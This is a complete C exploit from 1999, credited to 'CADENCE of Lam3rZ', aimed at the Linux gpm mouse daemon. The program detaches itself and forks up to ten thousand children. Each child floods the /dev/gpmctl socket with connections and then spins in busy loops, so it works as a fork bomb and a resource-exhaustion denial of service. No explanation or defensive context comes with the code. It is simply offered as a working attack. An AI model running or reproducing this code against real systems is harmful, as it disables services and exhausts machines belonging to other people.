// FuckGpm    CADENCE of Lam3rZ    1999.11.23

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#define GDZIE    "/dev/gpmctl"
#define POLACZENIA 200
#define SHITY   10000


int main (void)
{
 int a,b;
 struct sockaddr_un sun;

 sun.sun_family = AF_UNIX;
 strncpy (sun.sun_path, GDZIE, 30);
 printf ("OK...\n");

 if (fork ())
  exit (0);

 for (b = 0; b < SHITY; b++)
  if (fork () == 0)
  break;

 for (b = 0; b < POLACZENIA; b++)
  {
   if ((a = socket (AF_UNIX, SOCK_STREAM, 0)) < 0)
    {
     perror ("socket");
     while (1);
   }

  if (connect (a, (struct sockaddr *) &sun, sizeof (struct sockaddr)) < 0)
   {
    perror ("connect");
    close (a);
    b--;
   }
  }

 while (1);
}
